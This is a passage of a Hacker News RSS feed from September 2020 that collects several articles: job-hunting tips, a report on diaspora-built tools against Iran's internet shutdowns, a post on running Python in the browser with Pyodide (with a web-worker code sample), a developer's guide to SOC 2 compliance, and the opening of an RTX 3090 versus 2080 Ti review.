href="https://www.nuviainc.com/"><span> </span></a><a href="http://www.nuviainc.com/"><span>www.nuviainc.com</span></a>.</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://nuviainc.com/news/nuvia-raises-240m-series-in-b-funding</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578646</guid>
            <pubDate>Thu, 24 Sep 2020 13:59:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What I Wish I Knew Before Searching for a PM Job]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578559">thread link</a>) | @ricotico060
<br/>
September 24, 2020 | https://jackantico.com/What-I-Wish-I-Knew-Before-I-Started-Job-Hunting/ | <a href="https://web.archive.org/web/*/https://jackantico.com/What-I-Wish-I-Knew-Before-I-Started-Job-Hunting/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>With the job hunting season well under way, I thought I would give a list of tips, tricks, and guiding principles I‚Äôve learned from hunting both this season and seasons past. Most of this advice centers around finding a Product or SWE job, but I‚Äôm sure some of it applies to other industries as well.</p>

<p><strong>Have a separate gmail account for applying to jobs.</strong> One of the most annoying things about being on the job hunt is the constant emails from companies. When you can be applying for up to 200+ jobs with tech companies, do yourself a favor and set up a separate account which you only check a few times a week. Seeing rejection email after rejection email come into the account you normally check can really put a strain on your mental health. Also, only have this account signed in on your computer, not your phone.</p>

<p><strong>You‚Äôre going to get rejected 95% of the time; apply to as many jobs as possible.</strong> I remember when I was searching for my first real internship; I applied to about 20 jobs in the first week and got rejected by all of them. During the college process, I applied to about 20 colleges as well and got into about half of them. At first, I felt incredibly hopeless after not getting moving on with a single company. After reading more about the process, however, I realized that this rejection rate was normal so I kept my head down and ended up getting an internship with a company really liked. Related to this note, I remember getting advice from the Career Center to really focus on just a few roles. Ignore that: apply to as many jobs as possible.</p>

<p><strong>Take a break from job boards every couple of weeks.</strong> It‚Äôs tempting to go with the strategy of ‚ÄúI‚Äôm going to apply to 5, 10, X amount of jobs every day‚Äù to boost your numbers. This can work for a period of time, but jobs boards really only refresh about once a month. What ends up happening (at least what happened with me) is I started applying to companies I really didn‚Äôt fit at just to hit my daily goal which led to me feeling burnt out. If you start seeing the early signs of burnout in yourself, I‚Äôd encourage you to take two or three weeks off and just don‚Äôt think about the job search.</p>

<p><strong>Keep an excel spreadsheet of jobs you have applied for.</strong> I can‚Äôt stress this one enough: keep a simple google sheet or excel spreadsheet of the companies you applied for and your current application status with them. It can help you visualize how your search is going and also makes sure you don‚Äôt apply to the same job as well. Additionally, say you find a company you really like when you‚Äôre searching for an internship. You can check out the one I made for my summer 2020 internship search <a href="https://docs.google.com/spreadsheets/d/1cJ5QLdFAmchnR231uSC5fxJifgo6HtrMniIahcDk4I4/edit?usp=sharing">here</a>.</p>

<p><strong>Download Clipboard History Pro to have all of your links handy.</strong> Most jobs apps require various links: a link to your Linkedin, Github, Portfolio, Twitter, and/or personal website. I used to just keep all these tabs open in my browser while I applied to jobs until I heard about clipboard extensions which remember the last 100 things you‚Äôve copied and pasted. I use Clipboard History Pro (no relation)</p>

<p><strong>Only do cover letters for jobs you really want.</strong> Take this tip with a grain of salt. I usually tell people to never do cover letters and have refused to do them myself in the past. Now, I can see why they might be useful at smaller companies where there are less applicants as there is a greater chance they actually get read. I would say only write a cover letter for companies with less than 200 employees.</p>

  </div></div>]]>
            </description>
            <link>https://jackantico.com/What-I-Wish-I-Knew-Before-I-Started-Job-Hunting/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578559</guid>
            <pubDate>Thu, 24 Sep 2020 13:47:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Iranian diaspora is using old-school tech to fight internet shutdown at home]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578551">thread link</a>) | @leoschwartz
<br/>
September 24, 2020 | https://restofworld.org/2020/cat-and-mouse-censorship/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/cat-and-mouse-censorship/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>One November morning last year, Mehdi Yahyanejad listened to a voicemail in his Los Angeles office: ‚ÄúI‚Äôm contacting you from the city of Tehran,‚Äù said the voice. ‚ÄúThis was the first time I‚Äôve experienced an internet shutdown. ‚Ä¶ It feels like I‚Äôm in a prison.‚Äù</p>



<p>A few weeks earlier, Iran‚Äôs largest mobile networks and internet providers went offline. Amid weeks of growing anti-regime protests, Iranian authorities imposed <a href="https://edition.cnn.com/2019/11/18/middleeast/iran-protests-explained-intl/index.html">the longest internet shutdown</a> in the country‚Äôs history, effectively cutting off external communication for over 80 million Iranians. In an unprecedented crackdown, regime forces <a href="https://www.amnesty.org/en/latest/news/2020/05/iran-details-released-of-304-deaths-during-protests-six-months-after-security-forces-killing-spree/">killed more than 300 protesters</a> and arrested <a href="https://www.amnesty.org/en/latest/news/2019/12/iran-thousands-arbitrarily-detained-and-at-risk-of-torture-in-chilling-post-protest-crackdown/">over 7,000 people</a>. When access was finally restored on November 23, nearly half the country was still unable to come online.</p>



<p>Nine months after the November blackout, Iranians still live in fear of another all-out shutdown. As authorities tighten their hold on internet access, diaspora-led companies are filling the gap for Iranians who are seeking a way to bypass censors. The circumvention tools, created largely by diaspora entrepreneurs, are becoming increasingly critical as they face a crackdown at home and the bite of American-led sanctions online.</p>



<p>On November 15, as Iranian authorities first moved to induce the digital blackout, 44-year-old Yahyanejad raced against the clock in Los Angeles to make sure that people back home had downloaded his satellite file-casting application <a href="https://www.toosheh.org/">Toosheh</a>.<em> </em>‚ÄúIt was a very small window,‚Äù says Yahyanejad. ‚ÄúOnce they were fully disconnected, I wasn‚Äôt sure they‚Äôd be able to download the software.‚Äù&nbsp;</p>



<p>Launched by Yahyanejad in 2016, the technology aggregates uncensored content, like news articles, YouTube videos, and podcasts, and sends it to Iranian homes directly via satellite TV. When Yahyanejad first began developing Toosheh in 2013, an estimated 70% of Iranian households owned a satellite dish, while around 20% had access to the internet. Even as internet access has grown, state censorship means Toosheh‚Äôs satellite technology is a much more reliable source for uncensored content. Iranians can install Toosheh‚Äôs satellite channel and receive a daily dispatch in the form of a file package of up to 8 gigabytes. Once a user downloads the app, the satellite transfers circumvent the internet entirely.&nbsp;</p>



<p>Yahyanejad says Toosheh gained nearly 100,000 new Iranians users in November 2019. In the absence of an internet connection, it became the only way for many users to access news from the outside world. The voice on Toosheh‚Äôs voicemail belonged to one such user, a 34-year-old high school principal in Tehran who downloaded emergency VPN and proxy tools delivered to him through the satellite service.&nbsp;</p>



<p>Having navigated extensive cyber censorship for over a decade, Iranians are tech savvy and <a href="https://www.bbc.com/news/blogs-trending-42612546">adept at nimbly crossing firewalls</a>, using proxies and foreign circumvention tools. ‚ÄúIt‚Äôs a constant cat-and-mouse game,‚Äù says Fereidoon Bashar, executive director of ASL19, a Canadian organization working to help Iranians bypass internet censorship. The group often works in tandem with Yahyanejad to distribute proxy tools.&nbsp;</p>



<p>Bashar says Iranians adapt quickly to ever-changing institutionalized control online. But the last five years of Iranian president Hassan Rouhani‚Äôs rule have seen <a href="https://www.cnet.com/news/irans-president-plans-to-cut-countrys-internet-off-from-the-rest-of-the-world/">a tighter grip on internet connections</a>. Site blocking and calculated internet outages have become easier to enforce: the regime has reduced Iran‚Äôs dependence on global networks by pushing a local intranet, with the <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">aim to keep online traffic</a> inside the country. With strict American sanctions that threaten hefty fines for companies interfacing with Iran, foreign tech companies limit ordinary Iranians‚Äô ability to purchase reliable proxies <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">out of an abundance of caution</a>. Riddled with insecurity, the local VPN black market is not a reliable option for those trying to avoid government attention.</p>



<p>But even as internet access grew incrementally difficult over the years, no one saw the November blackout coming. ‚ÄúAn internet shutdown was previously viewed as a kind of dystopian political campaign,‚Äù says Kaveh Azarhoosh, an internet policy researcher. In November, the worst-case scenario for Iran‚Äôs censorship suddenly became a reality.&nbsp;&nbsp;</p>



<p>In the early days of the protest, Toosheh created a special ‚ÄúProtest News Package.‚Äù Every night, after aggregating content from over 200 publications, Toosheh delivered digital bundles containing clips of protests occuring in different cities: Tabriz, Qom, Shiraz, Mashhad, and others. It also contained slides about how to stay safe during a protest; crucial news coverage from banned sites, like the <em>New York Times</em>, Voice of America Persian, and Deutsche Welle; and a curated compilation of tweets from Iranian politicians. These packages weren‚Äôt just bringing news of the outside world to Iran: they kept Iranians informed about what was happening inside their own country too.</p>



<p>Yahyanejad, a physicist by training, left Iran in 1997 to pursue a Ph.D. from the Massachusetts Institute of Technology. ‚ÄúI‚Äôve lived in Iran, and I‚Äôve gone to school and college there,‚Äù he explains. ‚ÄúI know that this repressive government exists because they are able to control the flow of information.‚Äù He says he‚Äôs always had an interest in limiting their control. ‚ÄúI want,‚Äù he says, ‚Äúto see democracy in Iran in my lifetime.‚Äù&nbsp;</p>



<p>In 2006, Yahyanejad launched a Reddit-like forum called <a href="https://www.balatarin.com/">Balatarin</a>. ‚ÄúIts popularity surprised me,‚Äù he says. The site posted a translated rumor about the supreme leader‚Äôs death, after he hadn‚Äôt been seen in public for two months, and was swiftly blocked by Iran shortly after. The moment was a turning point for Yahyanejad, who says, ‚ÄúI made a conscious decision to keep the platform open at a personal cost.‚Äù&nbsp;</p>



<p>The Iranian blocks on Balatarin inspired Yahyanejad to explore censorship circumvention. He launched the satellite app Toosheh in 2016. ‚ÄúI <a href="https://www.youtube.com/watch?v=FWfwF8Gx6VA">went on BBC Persian‚Äôs ‚ÄòNewshour</a>,‚Äô and as soon as I talked about it, people started downloading and testing it immediately,‚Äù he says.&nbsp;</p>



<p>Yahyanjad finds himself among a cohort of diaspora Iranians working to fight the regime‚Äôs censors. ASL19, the Canadian technology group, collaborated with him to deliver proxy tools to over half a million Iranians during November‚Äôs shutdown. ASL19‚Äôs Bashar, who left Iran in the early 2000s before <a href="https://opennet.net/blog/2013/02/after-green-movement-internet-controls-iran-2009-2012">the tumultuous Green Movement</a>, says diaspora Iranians are stepping into the field because Iranians ‚Äúrisk harsh conditions, imprisonment, and long sentences‚Äù if they‚Äôre caught creating circumvention tools inside the country.&nbsp;&nbsp;</p>



<p>But even outside of Iran, outspoken diaspora activists like Bashar and Yahyanejad face immense risks. In June, it was reported that an Iranian activist named Ruhollah Zam was <a href="https://www.bbc.com/news/world-middle-east-53238000">sentenced to death </a>in Iran after creating a popular anti-government Telegram news channel that he operated while living in exile in France. The channel, with 1.4 million followers, was shut down shortly after. For Yahyanejad, who knew of Ruhollah through the diaspora community, the ordeal was a shot across the bow. ‚ÄúI can never go back to Iran,‚Äù Yahyanejad admits. ‚ÄúBut I see myself as part of the movement.‚Äù&nbsp;</p>



<p>Yahyanejad‚Äôs work has become crucial for Iranians, even after November‚Äôs shutdown. On July 14, following news that Iran‚Äôs Supreme Court had upheld the death sentences of three young anti-regime protesters, Iranians took to banned social media sites in an unprecedented protest, with over 6 million posts under the hashtag #DontExecute. Hours after #DontExecute began trending online, digital rights organization NetBlocks <a href="https://twitter.com/netblocks/status/1283106806332620801?s=20">monitored disruptions in the network</a>. Panicked users, still reeling from November‚Äôs shutdown, speculated another block was imminent. Luckily, an all-out ban didn‚Äôt occur, but the renewed threat of one was enough to increase Toosheh‚Äôs usage by more than 50% in the days that followed.&nbsp;</p>



<p>For Yahyanejad, who has been actively fighting the Iranian regime‚Äôs censorship for over a decade, the past year is proof that his work is even more necessary. ‚ÄúInternet shutdowns are psychological tools designed to terrify populations, to convince them that they are voiceless,‚Äù he says. ‚ÄúFighting shutdowns is important so that you can show people that they are not alone and that there are others.‚Äù</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/cat-and-mouse-censorship/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578551</guid>
            <pubDate>Thu, 24 Sep 2020 13:46:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Python in the Browser with Web Assembly]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578499">thread link</a>) | @lanecwagner
<br/>
September 24, 2020 | https://qvault.io/2020/09/24/running-python-in-the-browser-with-web-assembly/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/09/24/running-python-in-the-browser-with-web-assembly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-67191" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
				
		
		<!-- .entry-header -->

		
		<div itemprop="text">
			
<p>We‚Äôve been wanting to expand <a href="https://app.qvault.io/">Qvault‚Äôs course curriculum</a>, and one of the most requested programming languages has been Python. Because our courses allow students to write and execute code right in the web browser, we decided to look into existing projects that allow a Python interpreter to run in the browser using Web Assembly. We settled on a tool called <a href="https://github.com/iodide-project/pyodide" rel="noopener">Pyodide</a>, which does just that.</p>



<p>To see it in action, check out the <a href="https://app.qvault.io/playground/python">finished product, a Python playground</a>.</p>



<h2>What is Pyodide?</h2>



<p>Pyodide is an open-source project that comprises a Python interpreter that has been compiled to Web Assembly.</p>



<blockquote><p>WebAssembly (abbreviated&nbsp;<em>Wasm</em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable compilation target for programming languages, enabling deployment on the web for client and server applications.</p><cite><a href="https://webassembly.org/" target="_blank" aria-label="webassembly.org (opens in a new tab)" rel="noreferrer noopener nofollow">webassembly.org</a></cite></blockquote>



<p>In other words, normally only JavaScript can run in a browser, but if you can compile your source code to Wasm, then you can run <em>any</em> programming language in the browser. (At the time of writing we run Python, Rust, and Go this way on our <a href="https://app.qvault.io/playground/python">playground</a> and in our <a href="https://app.qvault.io/">courses</a>)</p>



<blockquote><p>Pyodide&nbsp;brings the Python 3.8 runtime to the browser via WebAssembly, along with the Python scientific stack including NumPy, Pandas, Matplotlib, parts of SciPy, and NetworkX. The&nbsp;<code>packages</code>&nbsp;directory&nbsp;lists over 35 packages which are currently available.</p><cite><a href="https://github.com/iodide-project/pyodide" target="_blank" aria-label="Github Project (opens in a new tab)" rel="noreferrer noopener nofollow">Github Project</a></cite></blockquote>



<h2>How Did We Do It?</h2>



<p>Our Python execution plan is quite similar to the way we run Go code in the browser. There are basically three steps:</p>



<ul><li>Write a worker file that defines how code is executed</li><li>Write a worker helper that abstracts the details of spinning up, communicating, and terminating workers</li><li>Implement the helper in the view so that users can execute code and see the code‚Äôs output</li></ul>



<p> If you want to know how that all works please read <a href="https://qvault.io/2020/09/23/running-go-in-the-browser-with-wasm-and-web-workers/">this article about Web Workers and WASM in Go before continuing.</a></p>



<p>If you have finished that first article on Web Workers, then all you will need to understand the difference between our Python and Go logic is the worker file itself:</p>



<pre><code lang="javascript">// pull down pyodide from the public CDN
importScripts('https://pyodide-cdn2.iodide.io/v0.15.0/full/pyodide.js');

addEventListener('message', async (e) =&gt; {
  // wait for the interpreter to be fully loaded
  await languagePluginLoader;

  self.runPythonWithStdout = () =&gt; {
    try {
      // execute the code passed to the worker
      pyodide.runPython(e.data);
    } catch (err){
      postMessage({
        error: err
      });
      return;
    }

    // capture the code's standard output
    // and send it back to the main thread
    let stdout = pyodide.runPython("sys.stdout.getvalue()")
    if (stdout) {
      stdout = stdout.split('\n')
      for (line of stdout){
        postMessage({
          message: line
        });
      }
    }
  }

  // redirect stdout to io.StringIO so that we can get it later
  pyodide.runPython(`
    import io, code, sys
    from js import runPythonWithStdout
    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()
    ## This runs self.runPythonWithStdout defined in the JS
    runPythonWithStdout()
  `)

  postMessage({
    done: true
  });
}, false);</code></pre>



<p>As you can see, the only particularly challenging part for our use case was adding the glue to properly capture the code‚Äôs standard output.</p>




		</div><!-- .entry-content -->

					<!-- .entry-meta -->
			</div><!-- .inside-article -->
</article><!-- #post-## -->

					

							</main><!-- #main -->
	</div><!-- #primary -->

	<!-- #secondary -->

	</div><!-- #content -->
</div></div>]]>
            </description>
            <link>https://qvault.io/2020/09/24/running-python-in-the-browser-with-web-assembly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578499</guid>
            <pubDate>Thu, 24 Sep 2020 13:40:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Developer's Guide to SoC 2 Compliance]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578450">thread link</a>) | @jacobwg
<br/>
September 24, 2020 | https://workos.com/blog/the-developers-guide-to-soc-2-compliance | <a href="https://web.archive.org/web/*/https://workos.com/blog/the-developers-guide-to-soc-2-compliance">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><p>Nobody wakes up in the morning excited to deal with a SOC 2 audit, but completing one will help your company grow and close larger deals faster. SOC 2 covers <em>a lot</em>, and it‚Äôs not just an engineering checkmark - but if you‚Äôre a developer at a not-huge company going through SOC 2 compliance, chances are you‚Äôll need to get involved. This guide will cover everything you need to know from a technical perspective, from basic access controls to encrypting data at rest. <em>‚Äç</em></p><p><em>(Note: this guide is NOT a comprehensive assessment of what you‚Äôll need to pass SOC 2 compliance, nor is it legal advice. The goal here is just to help developers understand what they‚Äôll need to do to make sure that tech and infrastructure aren‚Äôt holding things up.)</em></p><h2>What SOC 2 is and why it's important</h2><p><em>SOC 2</em> is a certification ‚Äì an objective third party checking your company out ‚Äì developed by the AICPA, one of the big ‚Äúgoverning bodies‚Äù of accountants in the U.S (riveting, I know). The way it works is that you hire an auditor to investigate how secure and trustworthy your company is, fill in any holes they identify, and then they certify you as SOC 2 compliant. Once you‚Äôve passed an audit, you can display the SOC 2 logo on your site, tell your customers and leads that you‚Äôre compliant, and close those bigger deals. </p><p>The important thing about SOC 2 is that it‚Äôs not just a stamp for giant enterprises - like <a href="https://workos.com/blog/the-developers-guide-to-sso">SSO</a> and <a href="https://workos.com/blog/the-developers-guide-to-directory-sync-scim">Directory Sync</a>, even fast growing startups are starting to require more advanced security measures before engaging with vendors. And as we‚Äôll see in a bit, most of what you‚Äôll need to work on to be SOC 2 compliant overlaps a lot with engineering best practices anyway. So if you‚Äôre considering whether SOC 2 compliance is worth it for your company, it might be a realistic fit earlier than you think - and help you stand out to potential customers.</p><p>Now if you‚Äôre thinking that SOC 2 implies the existence of a SOC 1, you‚Äôd be right, but SOC 1 is a lot less popular among SaaS startups. It‚Äôs generally a lower lift certification and doesn‚Äôt meet the security requirements that those larger deals are looking for. There‚Äôs also a SOC 3, but same story here - generally not the focus for the customers you‚Äôre trying to woo. SOC 2 is the big one.</p><p>So what exactly are these auditors looking for? What makes your company SOC 2 compliant? The answer, weirdly enough, is that criteria are subjective and company-specific - the auditor you work with will put together a plan. Generally, they‚Äôre looking for a few things:<br></p><ul role="list"><li>There‚Äôs quality <strong>oversight of the company</strong> as a whole (performance reviews, independent voices, background checks, etc.)</li><li>The <strong>SDLC</strong> (software development lifecycle) is transparent, trackable, and controlled (issue tracking, unit testing, version control, etc.)</li><li>Your <strong>application and underlying infrastructure</strong> are secure and monitored (encryption, logging, APM, vulnerability scans, etc.)</li><li>You‚Äôve implemented <strong>access controls</strong> for internal services and SaaS (de-provisioning accounts, 2FA, malware detection, etc.)</li></ul><p>If a lot of these examples look familiar to you, it‚Äôs because you‚Äôve probably already implemented them. The good news about SOC 2 is that as it relates to engineering, the requirements are generally pretty agreeable and a lot of modern SWE orgs already have issue tracking, review pipelines, vulnerability checks, and a good amount of the remaining checks auditors will be looking for. </p><p>We‚Äôll dive into the SDLC, app and infrastructure, access controls, and then take a look at how you can save time with pre-built software like <a href="https://www.vanta.com/">Vanta</a> that takes care of a lot of the annoying work you need to do for SOC 2, like policy generation.<strong>‚Äç</strong></p><h2><strong>The SDLC</strong>‚Äç</h2><p>Your auditor will put together a list of concrete checks that you‚Äôll need to either (a) provide evidence that you‚Äôve already done, or (b) get started on doing. Again - this is not a comprehensive list, but it should help you get started and think about what auditors will be looking for.<strong>‚Äç</strong></p><p><strong>‚Üí Issue Tracking</strong>‚Äç</p><p>Any ‚Äúissues‚Äù that relate to the core business - new features, products, bugs, vulnerabilities, etc. - should be tracked. There are a hundred ways to do this - if you‚Äôre at a bigger company you‚Äôre probably using <a href="https://www.atlassian.com/software/jira">JIRA</a>, the cool kids are using <a href="https://linear.app/">Linear</a>, and there‚Äôs also <a href="https://clubhouse.io/">Clubhouse</a>, <a href="https://guides.github.com/features/issues/">GitHub Issues</a>, and many many more. The auditors are just looking to make sure known problems don‚Äôt slip through the cracks, and when a problem arises it‚Äôs dealt with effectively and in a timely manner.<br></p><figure id="w-node-361755762ee0-e13c3243"><p><img src="https://assets-global.website-files.com/5f03ef1d331a69193fae6dcd/5f4fb0d32ee58930e6b6eb82_image%20(6).png" loading="lazy" alt=""></p></figure><p>They might ask for a sample of your tracked issues over a given time period. You‚Äôll save yourself a bunch of time down the road by finding a way to link commits and PRs to specific tickets, e.g. via a naming convention (BUG-453-fix-broken-dropdown).<strong>‚Äç</strong></p><p><strong>‚Üí Change Testing and Review Cycles</strong>‚Äç</p><p>Auditors will be looking for documented policies that govern how you track, test, approve, and validate changes to your core application. Now ideally if you‚Äôre reading this, you‚Äôre not pushing directly to master - you‚Äôve got a staging environment set up and a pull request process with required reviewers. Internal documentation might suffice here, but you‚Äôll probably need to generate a policy (something Vanta can help with - more on that later).</p><p>If you‚Äôre working via a monorepo, building foolproof review cycles is pretty easy (it‚Äôs just a setting in GitHub). But if you‚Äôve got a bunch of repositories all constantly changing, they should all ideally require reviews before merging in changes. Even if there‚Äôs only one engineer pushing code, laptops can get lost or stolen, and auditors will want to see that extra security to bestow the SOC 2 stamp.<strong>‚Äç</strong></p><h2><strong>Application and infrastructure</strong></h2><p>Here, auditors are trying to verify that your app is generally reliable, trackable, and that you fix things quickly when they come up. Again - all things that you probably already care about.<strong>‚Äç</strong></p><p><strong>‚Üí Encryption</strong>‚Äç</p><p>You‚Äôll generally want to encrypt customer data at rest, and make sure that sensitive requests (especially if they‚Äôre auth or customer data related) are encrypted in transit/motion (e.g. HTTPS). Ideally your site and app have SSL enforced, your certificate isn‚Äôt expired (duh), and there aren‚Äôt any known issues. Some auditors will also require an encryption policy that describes your company‚Äôs approach to encryption.<strong>‚Äç</strong></p><p><strong>‚Üí APM / Monitoring</strong>‚Äç</p><p>To be SOC 2 compliant, you‚Äôll need to set up a basic application monitoring system, either in house or via a vendor like <a href="https://www.datadoghq.com/">Datadog</a>. Auditors will also be interested in <em>what you do with this information</em> - how often is there downtime? How quickly does it get resolved? You might need to provide screenshots of outage statistics via your APM tool, and evidence that you resolved the issue via your issue tracking software. These usually come in the form of a post mortem / analysis and remedy of the root cause.</p><p>It‚Äôs not a given, but some auditors will specifically require that you set up a Load Balancer to handle traffic, and monitor that Load Balancer as well as your core app.<strong>‚Äç</strong></p><p><strong>‚Üí Logging and Backups</strong>‚Äç</p><p>Auditors will be looking for centralized logging from your app into a secure spot, via something custom like flat files, Elasticsearch, or an out of the box setup like Heroku (if you‚Äôre running on PaaS). You might be asked for daily backups - auditors are generally more concerned with your app‚Äôs data than your app itself, so if you‚Äôre using something like RDS, you can rely on their backup to S3 feature.<strong>‚Äç</strong></p><p><strong>‚Üí Vulnerabilities</strong>‚Äç</p><p>Unsurprisingly, this is a major focus of the audit process, even if it‚Äôs not a common day-to-day occurrence. Auditors are basically looking for 3 major things here:<br></p><ol role="list"><li>There‚Äôs a safe way for anyone (literally, anyone) to notify your company of vulnerabilities</li><li>Your team is proactively checking for vulnerabilities via review meetings and software</li><li>When a vulnerability gets uncovered, your team fixes it </li></ol><p>You‚Äôll want to set up an email inbox for disclosing vulnerabilities (e.g. <a href="https://workos.com/cdn-cgi/l/email-protection#d9aabcbaacabb0ada099aeb6abb2b6aaf7bab6b4"><span data-cfemail="e596808690978c919ca5928a978e8a96cb868a88">[email&nbsp;protected]</span></a>), put together a policy for how you handle incident response, and (if relevant) provide evidence that you‚Äôve resolved any major vulnerabilities (i.e. a post-mortem). Auditors will also look for proactive vulnerability scanning. If you‚Äôre running on managed infrastructure like Heroku, they do a lot of that for you. GitHub will also <a href="https://docs.github.com/en/github/managing-security-vulnerabilities/about-alerts-for-vulnerable-dependencies">notify you of any dependencies with known vulnerabilities</a>.<strong>‚Äç</strong></p><h2><strong>Access controls / SaaS</strong></h2><p>This is where things get a bit tedious. In addition to your core infra (AWS or whatever cloud you‚Äôre using), chances are you‚Äôre using a bunch of SaaS like PagerDuty, Segment, GitHub, and the like, some cloud based and some (potentially) on prem. Auditors are looking for rigid access controls: only relevant team members should have access to customer data and applications, and access needs to be revoked when employees leave the company.<strong>‚Äç</strong></p><p><strong>‚Üí Core Infrastructure Access</strong>‚Äç</p><p>Auditors will be looking for even stricter controls when it comes to managing core infra. In practice, this means a robust IAM setup in AWS (or your cloud provider of choice) with clear lines between admins and non-admins, and a review process for adding new folks to the organization. You might need to prove that review via a screenshot of someone asking permission, or something along those lines.</p><p>As part of this review, you‚Äôll probably end up needing to remove users from accounts that they previously had access to. Early on in the company lifecycle things are pretty free rein, but auditors will want to make sure that if you have no business querying the warehouse, you‚Äôre not on BigQuery.<strong>‚Äç</strong></p><p><strong>‚Üí De-provisioning Users</strong>‚Äç</p><p>If an employee leaves the company or gets terminated, their access to all company accounts - infrastructure, SaaS, any anything else - needs to be revoked, and auditors will often look for this to happen within one business day of the employee‚Äôs last day with the company. You‚Äôll probably need to do this manually for the first couple of years in the company lifecycle, but eventually you‚Äôll want to <a href="https://workos.com/blog/the-developers-guide-to-directory-sync-scim">set up Directory Sync so computers can do it for you</a>.<strong>‚Äç</strong></p><p><strong>‚Üí MFA</strong>‚Äç</p><p>Any method for accessing customer data needs to be protected by (at least) ‚Ä¶</p></figure></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://workos.com/blog/the-developers-guide-to-soc-2-compliance">https://workos.com/blog/the-developers-guide-to-soc-2-compliance</a></em></p>]]>
            </description>
            <link>https://workos.com/blog/the-developers-guide-to-soc-2-compliance</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578450</guid>
            <pubDate>Thu, 24 Sep 2020 13:34:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Jittery ‚Äì A new type of knowledge service]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24578403">thread link</a>) | @jittery
<br/>
September 24, 2020 | https://jittery.com/Jittery | <a href="https://web.archive.org/web/*/https://jittery.com/Jittery">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://jittery.com/Jittery</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578403</guid>
            <pubDate>Thu, 24 Sep 2020 13:29:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RTX 3090 vs. 2080 Ti ‚Äì Worth Upgrading?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578375">thread link</a>) | @SimonAC
<br/>
September 24, 2020 | https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading | <a href="https://web.archive.org/web/*/https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    
                    <p>I‚Äôve compared Nvidia‚Äôs new RTX 3090 graphics card against the 2080 Ti from last generation in games at 4K, 1440p, and 1080p resolutions as well as content creator workloads to see what the differences are.</p>
<p>Let‚Äôs start with the spec differences.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9a69ef578.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9a69ef578.webp">The 3090 has around 141% more CUDA cores than the 2080 Ti and 118% more memory. The 3090‚Äôs memory is also faster, and the 3090 has higher base and boost clock speeds as well, so it‚Äôs basically better in all regards, though it does also use more power.</p>
<p>Of course, at the moment the 3080 is closer in price to the 2080 Ti, but I don‚Äôt have a 3080 yet, I don‚Äôt think anyone does, and although the 2080 Ti had a $1000 MSRP, it seemed to sell around the $1200 USD price point, so $300 below the 3090 launch price.</p>
<p>The system that I‚Äôm testing with uses the Intel i9-10900K overclocked to 5.2GHz on all 10 cores in an MSI Z490 ACE Motherboard with 32gb of DDR4-3200 CL14 memory running in dual channel.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9a9308564.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9a9308564.webp">I‚Äôve got MSI‚Äôs GeForce RTX 3090 Gaming X Trio, and my Aorus 2080 Ti to compare with.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9aa5b3ab2.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9aa5b3ab2.webp">The latest drivers at the time of testing were used on both GPUs, so let‚Äôs get into the results.</p>
<h2>Gaming benchmarks</h2>
